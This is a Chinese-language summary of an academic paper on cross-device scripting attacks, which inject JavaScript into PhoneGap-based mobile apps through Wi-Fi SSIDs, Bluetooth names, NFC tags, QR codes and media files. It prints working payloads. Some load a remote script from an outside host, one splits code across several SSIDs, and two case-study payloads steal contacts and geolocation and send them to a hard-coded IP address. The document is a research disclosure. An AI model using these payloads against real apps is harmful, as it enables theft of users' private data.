# XDS: Cross-Device Scripting Attacks

from：http://www.cis.syr.edu/~wedu/Research/paper/xds_attack.pdf

0x00 摘要
-------

* * *

基于HTML5的移动应用程序变得越来越于流行，主要是因为他们更容易在不同的移动平台进行移植。基于HTML5的应用程序使用标准的Web技术，包括HTML5 ， JavaScript和CSS;它们依赖于一些如PhoneGap的中间件与底层的操作系统进行交互。

JavaScript是容易受到代码注入攻击的，我们已经进行了基于HTML5移动应用系统的研究，试图评估依靠Web技术的移动应用开发是否是安全的。我们的发现是相当惊人的：如果基于HTML5的移动应用变得流行，似乎根据当前所调查的结果，我们每天常做的操作可能会变得危险，包括二维条码读取，扫描Wi-Fi接入点，播放MP4影片，配对蓝牙设备等。

除了通过实例的应用程序演示的攻击，我们已经研究了186个PhoneGap的插件，使用应用程序来实现各种功能，发现其中11是可被攻击的。还发现了两个现实当中的基于HTML5的应用程序，很容易受到攻击。

0x01 背景
-------

* * *

基于HTML5的移动应用程序大多数不能直接运行在移动系统，如Android和iOS ，因为这些系统不支持HTML5和JavaScript本身; Web容器需要渲染HTML5以及执行JavaScript代码。

大多数移动系统有这样的容器：在Android中它是WebView，iOS中是UIWebView，Windows Phone中是WebBrowser。为简单起见，我们以下都用WebView来表述。

WebView： WebView中最初被设计为允许本地应用程序处理和显示网页内容。它基本上包的网络浏览功能组合成一个类，可以嵌入到一个应用程序，基本上是网页浏览器应用程序的组件。用WebView中提供的API ，移动应用程序还可以自定义WebView里面的HTML页面。

由于WebView中用于加载Web内容，它通常是不可信的， WebView像浏览器一样实现了一个沙盒，使内部的JavaScript代码只能在一个独立的环境中运行。

这样的沙箱适用于网页内容，但对于移动应用程序限制还是太大，因为它不能访问系统资源，如文件，设备传感器，照相机等。

WebView在JavaScript代码和本机代码（例如， Java的）之间搭建了一个的桥梁。这座桥可让JavaScript代码来调用主机代码。

已经有人开发了几个中间件框架，包括PhoneGap ， Rhomobile， Appcelerator等。

在本文中，我们选择把重点放在最流行的PhoneGap。然而，我们的攻击也可以应用于其他中间件。

PhoneGap和PhoneGap插件：PhoneGap帮助开发人员创建使用基于HTML5标准的移动应用程序Web。开发人员在HTML，JavaScript和CSS中写应用程序。该PhoneGap的框架默认情况下嵌入一个WebView中实例的应用程序，并依靠这个WebView来呈现HTML页面和执行JavaScript代码。

![enter image description here](http://drops.javaweb.org/uploads/images/1a9caea4b9886ee8b236b6550390883c717b8ca2.jpg)

PhoneGap架构图

0x02 XDS攻击
----------

* * *

有两种方式可以让JavaScript的字符串当成代码执行，一种是利用eval() API，另一种是通过DOM API和属性，如document.write(), appendChild(), innerHTML等。一些jQuery的展示API也有问题，例如html()和append()。

```
// Using Script Tag.
<script>alert(’attack’)</script>...Data...
// Using the IMG Tag’s onerror attribute. 
<IMG src=x onerror="alert(’attack’)">...Data...

```

![enter image description here](http://drops.javaweb.org/uploads/images/bf285c3563e1c76a710a37838c5ab2c416904078.jpg)

DOM(jQuery)展示API和属性（勾表示能触发，叉表示不能出发）。

### ID Channels

在某些情况下，在移动设备建立与外部建立连接之前，它从外部获对应ID，并显示给用户。我们研究如何这样的ID通道利用恶意代码注入到移动设备当中。

#### Wi-Fi AP

找到附近的Wi -Fi接入点，许多智能手机用户安装某些Wi-Fi扫描仪程序，扫描附近可用的Wi-Fi热点，并显示他们的服务集标识符（SSID ）。

为了演示攻击，我们设置SSID下面的JavaScript代码：

```
<script>alert('attack')</script>

```

程序展示使用java写的所以不会执行js代码：

![enter image description here](http://drops.javaweb.org/uploads/images/0f00025dbba6830c0e61cdce63ba599fc0f7cdfb.jpg)

非PhoneGap应用

使用PhoneGap实现的，SSID将在WebView中显示，这个程序使用html() API展示的SSID导致JavaScript代码执行。

![enter image description here](http://drops.javaweb.org/uploads/images/eb26442e95594541f203f3b5bced9abb82cb8dd4.jpg)

PhoneGap应用

同时蓝牙当中也可能出现类似的问题。

#### NFC读取软件当中：

![enter image description here](http://drops.javaweb.org/uploads/images/fa0310b5cb4fceb5e9fadb1da0ee874327f35c7f.jpg)

非PhoneGap应用

![enter image description here](http://drops.javaweb.org/uploads/images/b645f72df8dc27a1f81b26e29210a9ef69ec4db9.jpg)

PhoneGap应用

#### 二维码扫描：

![enter image description here](http://drops.javaweb.org/uploads/images/6d2a826792c767b22891b70af4f3fe616adf9525.jpg)

非PhoneGap应用

![enter image description here](http://drops.javaweb.org/uploads/images/cb93cde7b7b6c73c432027d266e06fdc9bb60e47.jpg)

PhoneGap应用

#### MP3, MP4, and Images

![enter image description here](http://drops.javaweb.org/uploads/images/9a8a442fd9de15f348440a0c8b13035bede0d7a6.jpg)

非PhoneGap应用

![enter image description here](http://drops.javaweb.org/uploads/images/2867bbdad7157b3c8b1bb3dc0edb4a408ae01509.jpg)

PhoneGap应用

等等……

0x04 限制
-------

* * *

在各场景中的长度限制

![enter image description here](http://drops.javaweb.org/uploads/images/3e855c90970cfce9814e725092d01130d8eb79ab.jpg)

可以看到Wi-Fi当中长度限制的最短。

可使用代码：

```
<script src=//mu.gl></script

```

img标签的话：

```
<img src onerror=d=document;b=d.createElement(’script’);d.body.appendChild(b);b.src=’http://mu.gl’>

```

如果有使用jQuery的话：

```
<img src onerror=$.getScript('http://mu.gl')>

```

如果要在SSID当中使用的话，可以使用经典的分割代码的方式：

```
<img src onerror=a="$.getScr">
<img src onerror=b="ipt(’ht">
<img src onerror=c="tp://mu.">
<img src onerror=d="gl’)">
<img src onerror=eval(a+b+c+d)> 

```

0x06 案例研究
---------

* * *

看看现实当中是否有app可以被攻击：

### 案例1 ： GWT Mobile PhoneGap Showcase。

这是一个PhoneGap的演示应用程序，它向开发人员展示了如何使用PhoneGap的和其插件。该应用程序包括了所有的内置插件和三个第三方插件，ChildBrowser插件，蓝牙插件， Facebook插件。

该app使用innerHTML来显示蓝牙设备的名称。我们把蓝牙名称改成攻击代码试一下：

```
< img src = x onerror = PhoneGap.exec(function(a) {

    m = '';
    for (i = 0; i < a.length; i++) {
        m += a[i].displayName + '\n';
    }
    alert(m);
    document.write('<img src=http://128.230.213.66:5556?c=' + m + '>');
},
function(e) {},
'Contacts', 'search', [['displayName'], {}]) > 

```

![enter image description here](http://drops.javaweb.org/uploads/images/4a4fdb28f6d674681baef07de6fefa47571d7db7.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/e230f8a8b1fea6afe7ef1d9f537fa2a25f9bd185.jpg)

### 案例2：RewardingYourself应用程序。

扫描二维码的程序，展示使用的innerHTML，我们在二维码当中插入如下代码：

```
< img src = x onerror =

navigator.geolocation.watchPosition(

function(loc) {

    m = 'Latitude: ' + loc.coords.latitude +

    '\n' + 'Longitude: ' + loc.coords.longitude;

    alert(m);

    b = document.createElement('img');

    b.src = 'http: //128.230.213.66:5556?c='+m })> 

```

使用geolocation.watchPosition获取当前位置。

![enter image description here](http://drops.javaweb.org/uploads/images/916da04b58b8acd34dddf982e316214c04e07a4d.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/689e89b62e8dff8f85d355c21d20e71407b1f2ba.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/3a15fb30cef8798f2b405cd4272c4c5ba8323a2d.jpg)